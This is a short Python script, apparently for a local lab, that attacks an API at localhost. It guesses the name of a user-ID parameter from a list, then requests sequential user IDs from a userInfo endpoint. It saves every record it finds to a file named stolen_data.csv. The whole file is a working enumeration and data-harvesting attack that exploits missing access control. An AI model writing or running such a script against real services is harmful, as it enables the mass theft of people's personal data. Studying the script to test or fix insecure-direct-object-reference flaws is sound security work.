import requests
import pandas as pd

# Define the API URL
API_PROTOCOL = "http"
API_IP = "127.0.0.1"
API_PORT = 5000
API_ENDPOINT = "userInfo"
api_url = f"{API_PROTOCOL}://{API_IP}:{API_PORT}/{API_ENDPOINT}"

# Create a session for making requests
session = requests.Session()


# Dictionary attack on the name of user ID parameter
possible_params = ["user_id", "user_Id",
                   "user_ID", "userid", "userId", "userID"]
actual_param = None
for param in possible_params:

    # Initialize variables
    stolen_data = {}
    userid = 0
    no_user_counter = 0
    fail_counter = 0

    # Make a POST request for each possible userid, incrementing userid by 1 each time
    while True:
        payload = {param: userid}
        response = requests.post(api_url, json=payload)

        # Check if the request was successful
        if response.status_code == 200:
            if actual_param is None:
                actual_param = param
                print(f"Found name of parameter: {actual_param}")
                print("-----Start Querying-----")
            result_json = response.json()
            if result_json["found"]:
                stolen_data[userid] = result_json["data"]
                no_user_counter = 0
                print(f"user ID {userid} found!")
            else:
                # Stop querying if corresponding user not found 20 times in a row despite incrementing it
                no_user_counter += 1
                if no_user_counter >= 20:
                    print(
                        f"No IDs found for {no_user_counter} times in a row. Assume reached end of table")
                    break

            userid += 1
            continue

        # Stop querying if the number of failed requests hits the specified threshold (3)
        fail_counter += 1
        if fail_counter >= 3:
            print(
                f"Request failed {fail_counter} times for {param}: {userid}, trying next param...")
            break

    if actual_param:
        print("-----End Querying-----")

        # Convert data to CSV format
        stolen_df = pd.DataFrame().from_dict(stolen_data, orient='index')
        stolen_df.to_csv("stolen_data.csv", index=False)
        print("Saved information to stolen_data.csv!")
        break
